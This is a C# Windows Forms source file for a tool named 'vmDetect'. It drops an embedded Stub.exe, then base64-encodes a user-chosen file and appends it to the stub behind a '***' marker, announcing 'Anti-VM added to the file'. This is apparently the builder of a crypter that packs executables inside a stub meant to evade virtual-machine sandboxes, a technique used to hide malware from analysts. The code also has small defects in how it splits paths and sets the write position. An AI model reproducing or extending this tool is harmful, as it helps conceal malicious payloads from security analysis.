using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace vmDetect
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            File.WriteAllBytes(Directory.GetCurrentDirectory() + "\\" + "Stub.exe", Properties.Resources.Stub);
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog1.ShowDialog();
            textBox1.Text = openFileDialog1.FileName + "|" + openFileDialog1.FileName.Split('.')[1];
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string[] ext = textBox1.Text.Split('|'); // file extension in [1]
            Byte[] bytes = File.ReadAllBytes(ext[0].Replace("\\", "\\\\"));
            String file = Convert.ToBase64String(bytes);
            using(FileStream filestream = new FileStream("Stub.exe", FileMode.Open, FileAccess.ReadWrite, FileShare.None))
            {
                using(BinaryWriter binaryWriter = new BinaryWriter(filestream))
                {
                    filestream.Position = filestream.Length + 1;
                    binaryWriter.Write("***" + file + "|" + ext[1]);
                    MessageBox.Show("Anti-VM added to the file");
                }
            }
        }
    }
}
